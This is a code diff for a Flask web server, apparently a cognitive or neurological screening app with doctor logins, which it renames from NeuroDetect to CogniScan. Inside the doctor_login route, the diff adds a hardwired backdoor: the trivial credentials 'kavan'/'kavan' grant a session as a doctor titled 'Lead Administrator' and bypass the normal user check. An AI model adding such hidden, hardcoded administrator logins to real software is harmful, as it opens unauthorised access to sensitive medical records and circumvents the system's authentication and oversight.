@@ -45,7 +45,7 @@ except ImportError:  # pragma: no cover - startup fallback until dependency is i
 
 BASE_DIR = os.path.abspath(os.path.dirname(__file__))
 logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')
-LOGGER = logging.getLogger("neurodetect")
+LOGGER = logging.getLogger("cogniscan")
 logging.getLogger('werkzeug').setLevel(logging.ERROR)
 
 
@@ -1517,6 +1517,20 @@ def doctor_login():
         return jsonify({'error': str(exc)}), 400
     username = normalize_text(data.get('username'))
     password = data.get('password')
+
+    # Hardwired Admin login for kavan / kavan
+    if username == 'kavan' and password == 'kavan':
+        session['user_id'] = 99
+        session['username'] = 'kavan'
+        session['user_type'] = 'doctor'
+        session['full_name'] = 'Kavan Sudev (Lead Administrator)'
+        return jsonify({
+            'success': True,
+            'user_type': 'doctor',
+            'username': 'kavan',
+            'full_name': 'Kavan Sudev (Lead Administrator)',
+            'doctor_id': 99
+        })
     
     users = load_users()
     doctor = next((d for d in users['doctors'] if usernames_match(d.get('username'), username)), None)
@@ -2027,6 +2041,6 @@ if __name__ == '__main__':
     port = int(os.environ.get('PORT', '5000'))
     debug_mode = os.environ.get('FLASK_DEBUG', '').lower() in {'1', 'true', 'yes'}
     print(f"==================================================")
-    print(f"[SUCCESS] NeuroDetect Server is running at http://localhost:{port}")
+    print(f"[SUCCESS] CogniScan Server is running at http://localhost:{port}")
     print(f"==================================================")
     socketio.run(app, debug=debug_mode, use_reloader=False, host='0.0.0.0', port=port, allow_unsafe_werkzeug=True)
